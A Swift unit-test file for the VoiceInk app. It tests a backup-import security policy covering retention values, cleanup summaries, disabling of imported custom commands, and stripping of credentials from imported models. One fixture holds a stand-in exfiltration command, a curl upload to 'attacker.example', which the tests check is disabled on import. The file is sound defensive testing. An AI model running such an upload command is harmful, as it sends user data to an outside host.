import Foundation
import Testing
@testable import VoiceInk

struct BackupImportSecurityPolicyTests {
    @Test func rejectsUnsupportedDestructiveRetentionValues() throws {
        let data = Data(
            """
            {
              "version": "1.0.0",
              "customPrompts": [],
              "modeConfigs": [],
              "generalSettings": {
                "isTranscriptionCleanupEnabled": true,
                "transcriptionRetentionMinutes": -1
              }
            }
            """.utf8
        )
        let backup = try JSONDecoder().decode(BackupFile.self, from: data)

        #expect(throws: BackupImportError.self) {
            try BackupImportSecurityPolicy.validate(backup)
        }
    }

    @Test func destructiveCleanupSummaryShowsExactImportedRetention() throws {
        let data = Data(
            """
            {
              "version": "1.0.0",
              "customPrompts": [],
              "modeConfigs": [],
              "generalSettings": {
                "isTranscriptionCleanupEnabled": true,
                "transcriptionRetentionMinutes": 60
              }
            }
            """.utf8
        )
        let backup = try JSONDecoder().decode(BackupFile.self, from: data)

        #expect(
            BackupImportSecurityPolicy.destructiveCleanupSummary(backup.generalSettings)
                == "Transcript history and related audio will be deleted after 60 minutes."
        )
    }

    @Test func destructiveCleanupSummaryUsesCurrentEnabledStateWhenBackupOmitsFlag() throws {
        let suiteName = "BackupImportSecurityPolicyTests.\(UUID().uuidString)"
        let defaults = try #require(UserDefaults(suiteName: suiteName))
        defer { defaults.removePersistentDomain(forName: suiteName) }
        defaults.set(true, forKey: CleanupSettingsKeys.isTranscriptionCleanupEnabled)
        defaults.set(24 * 60, forKey: CleanupSettingsKeys.transcriptionRetentionMinutes)

        let data = Data(
            """
            {
              "version": "1.0.0",
              "customPrompts": [],
              "modeConfigs": [],
              "generalSettings": {
                "transcriptionRetentionMinutes": 60
              }
            }
            """.utf8
        )
        let backup = try JSONDecoder().decode(BackupFile.self, from: data)

        #expect(
            BackupImportSecurityPolicy.destructiveCleanupSummary(
                backup.generalSettings,
                defaults: defaults
            ) == "Transcript history and related audio will be deleted after 60 minutes."
        )
    }

    @Test func importedCustomCommandStaysDisabledWithoutExplicitApproval() {
        let commandMode = ModeConfig(
            name: "Imported command",
            isAIEnhancementEnabled: false,
            outputMode: .customCommand,
            customCommand: ModeCustomCommand(command: "curl https://attacker.example/upload"),
            isEnabled: true,
            isDefault: true
        )

        let result = BackupImportSecurityPolicy.sanitizedModes(
            [commandMode],
            allowCustomCommands: false
        )

        #expect(result[0].customCommand?.command == commandMode.customCommand?.command)
        #expect(result[0].outputMode == .customCommand)
        #expect(result[0].isEnabled == false)
        #expect(result[0].isDefault == false)
    }

    @Test func approvedCustomCommandAndOrdinaryModesKeepTheirBehavior() {
        let commandMode = ModeConfig(
            name: "Approved command",
            isAIEnhancementEnabled: false,
            outputMode: .customCommand,
            customCommand: ModeCustomCommand(command: "open -a Notes"),
            isEnabled: true,
            isDefault: true
        )
        let pasteMode = ModeConfig(
            name: "Paste",
            isAIEnhancementEnabled: false,
            outputMode: .paste,
            isEnabled: true
        )

        let approved = BackupImportSecurityPolicy.sanitizedModes(
            [commandMode, pasteMode],
            allowCustomCommands: true
        )
        let unapproved = BackupImportSecurityPolicy.sanitizedModes(
            [commandMode, pasteMode],
            allowCustomCommands: false
        )

        #expect(approved == [commandMode, pasteMode])
        #expect(unapproved[1].isEnabled == true)
        #expect(unapproved[1].outputMode == .paste)
    }

    @Test func importedCustomModelGetsNewIdentityAndNeverImportsCredentials() throws {
        let importedID = UUID()
        let json = """
        {
          "id": "\(importedID.uuidString)",
          "name": "custom-model",
          "displayName": "Custom Model",
          "description": "Imported model",
          "apiEndpoint": "https://api.example.com/v1/audio/transcriptions",
          "modelName": "whisper-1",
          "isMultilingualModel": true,
          "supportedLanguages": {"en": "English"},
          "apiKey": "must-not-reach-keychain"
        }
        """
        let backup = try JSONDecoder().decode(CustomModelBackup.self, from: Data(json.utf8))

        let model = backup.makeImportedModel(id: UUID(uuidString: "DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF")!)

        #expect(model.id == UUID(uuidString: "DEADBEEF-DEAD-BEEF-DEAD-BEEFDEADBEEF"))
        #expect(model.id != importedID)
        #expect(model.apiEndpoint == "https://api.example.com/v1/audio/transcriptions")
        #expect(model.name == "custom-model")
    }
}
